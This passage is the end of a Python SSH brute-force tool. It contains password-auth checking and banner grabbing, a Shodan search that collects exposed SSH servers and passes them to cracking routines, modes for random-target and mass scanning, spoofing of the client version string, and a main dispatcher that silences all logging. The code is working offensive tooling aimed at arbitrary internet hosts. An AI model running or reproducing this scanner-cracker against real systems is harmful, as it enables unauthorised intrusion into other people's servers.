    if opts['verbose']:
      log(f'pwauth disabled: {host}:{port} ({allowed})', 'warn')
  except paramiko.AuthenticationException:
    log(f'{host}:{port}:pwauth=yes\n')
    if opts['verbose']:
      log(f'pwauth enabled: {host}:{port}', 'good')
  except (paramiko.ssh_exception.NoValidConnectionsError,
      socket.error):
    if opts['verbose']:
      log(f'could not connect: {host}:{port}', 'warn')
  except paramiko.SSHException as err:
    if opts['verbose']:
      log(f'ssh error: {host}:{port} ({str(err)})', 'warn')
  except Exception as err:
    if opts['verbose']:
      log(f'other error: {host}:{port} ({str(err)})', 'warn')
  finally:
    if t:
      try:
        t.close()
      except OSError:
        pass
    if sock:
      try:
        sock.close()
      except OSError:
        pass

  return


def check_pwauths():
  try:
    with open(opts['targetlist'], 'r', encoding='latin-1') as fh:
      with ThreadPoolExecutor(opts['bthreads']) as exe:
        futures = set()
        max_pending = opts['bthreads'] * 4
        for line in fh:
          line = line.strip()
          if not line:
            continue
          target = parse_target(line)
          host = ''.join([*target])
          if not host:
            continue
          ports = target.get(host)
          for port in ports:
            if len(futures) >= max_pending:
              _, futures = wait(futures, return_when=FIRST_COMPLETED)
            futures.add(exe.submit(check_pwauth, host, port))
  except (FileNotFoundError, PermissionError) as err:
    log(f"{err.args[1].lower()}: {opts['targetlist']}", 'error')

  return


def crack_shodan(targets):
  log(f'w00t w00t, found {len(targets)} sshds', 'good')
  log('cracking shodan targets', 'info')
  opts['targetlist'] = 'sshds.txt'
  log_targets(targets, opts['targetlist'])
  log(f'saved found sshds to {opts["targetlist"]}', 'info')
  log('cracking found targets', 'info')
  crack_multi()

  return


def shodan_search():
  s = opts['sho_opts'].split(';')
  if len(s) != 3:
    log('format wrong, check usage and examples', 'error')
  opts['sho_str'] = s[0]
  opts['sho_page'] = int(s[1])
  opts['sho_lim'] = int(s[2])

  try:
    api = shodan.Shodan(opts['sho_key'])
    res = api.search(opts['sho_str'], opts['sho_page'], opts['sho_lim'])
    for r in res.get('matches', []):
      ip = r.get('ip_str')
      port = r.get('port')
      if not ip or not port:
        continue
      banner = (r.get('data') or '').split('\n')[0]
      if opts['verbose']:
        log(f'found sshd: {ip}:{port}:{banner}', 'good', esc='\n')
      stargets.append(f'{ip}:{port}:{banner}\n')
  except shodan.APIError as e:
    log(f'shodan error: {str(e)}', 'error')

  return


def is_root():
  if os.geteuid() == 0:
    return True

  return False


def main(cmdline):
  sys.stderr.write(BANNER + '\n\n')
  check_argc(cmdline)
  parse_cmdline(cmdline)
  check_argv(cmdline)

  if opts['sshver']:
    v = opts['sshver']
    if v.startswith('SSH-'):
      parts = v.split('-', 2)
      if len(parts) == 3:
        v = parts[2]
    paramiko.Transport._CLIENT_ID = v

  log('game started', 'info')

  if opts['session']:
    sess = _load_session(opts['session'])
    if sess:
      _apply_session(sess)
      log(f'restored session from {opts["session"]}', 'info')

  global _progress_running
  prog_thread = None
  if not opts['verbose']:
    _progress_running = True
    prog_thread = threading.Thread(target=_progress_loop, daemon=True)
    prog_thread.start()

  interrupted = False
  try:
    if '-p' in cmdline:
      log('checking password auth', 'info', esc='\n')
      if not opts['targetlist'] and opts['targets']:
        host, ports = list(opts['targets'].copy().items())[0]
        for port in ports:
          check_pwauth(host, port)
      else:
        check_pwauths()
    elif '-b' in cmdline:
      log('grabbing banners', 'info', esc='\n')
      if not opts['targetlist'] and opts['targets']:
        host, ports = list(opts['targets'].copy().items())[0]
        for port in ports:
          grab_banner(host, port)
      else:
        check_banners()
    elif '-m' in cmdline:
      if is_root():
        if '-r' in cmdline:
          log('scanning and cracking random targets', 'info')
          crack_random()
          crack_scan()
        else:
          log('scanning and cracking targets', 'info')
          crack_scan()
      else:
        log('get r00t for this option', 'error')
    elif '-s' in cmdline:
      with ThreadPoolExecutor(1) as e:
        future = e.submit(shodan_search)
        status(future, 'searching for sshds via shodan\r')
      log('\n')
      if len(stargets) > 0:
        crack_shodan(stargets)
      else:
        log('no sshds found :(', 'info')
    elif not opts['targetlist'] and opts['targets']:
      log('cracking single target', 'info')
      crack_single()
    elif opts['targetlist']:
      if opts['shuffle']:
        shuffle_targets()
      if opts['randbrute'] is not None:
        label = 'infinite' if opts['randbrute'] == 0 else str(opts['randbrute'])
        log(f'random brute mode ({label} attempts)', 'info')
        crack_rand_brute()
      else:
        crack_multi()
  except KeyboardInterrupt:
    interrupted = True
    _progress_running = False
    log('you aborted me', _type='warn', pre_esc='\r  \r')
  finally:
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    _progress_running = False
    if prog_thread:
      prog_thread.join(timeout=1)
    _save_and_log_session(interrupted)
    log('game over', 'info')
    _cleanup_temp_files()
    os._exit(SUCCESS)

  return


def _silence_close_ebadf(args):
  if args.exc_type is OSError and \
      getattr(args.exc_value, 'errno', None) == errno.EBADF:
    return
  threading.__excepthook__(args)

  return


def _sigterm_handler(signum, frame):
  raise KeyboardInterrupt

  return


if __name__ == '__main__':
  logger = logging.getLogger()
  logger.disabled = True
  logger.setLevel(100)
  logger.propagate = False
  logging.disable(logging.ERROR)
  logging.disable(logging.FATAL)
  logging.disable(logging.CRITICAL)
  logging.disable(logging.DEBUG)
  logging.disable(logging.WARNING)
  logging.disable(logging.INFO)
  if not sys.warnoptions:
    warnings.simplefilter('ignore')
  threading.excepthook = _silence_close_ebadf
  signal.signal(signal.SIGTERM, _sigterm_handler)

  main(sys.argv[1:])

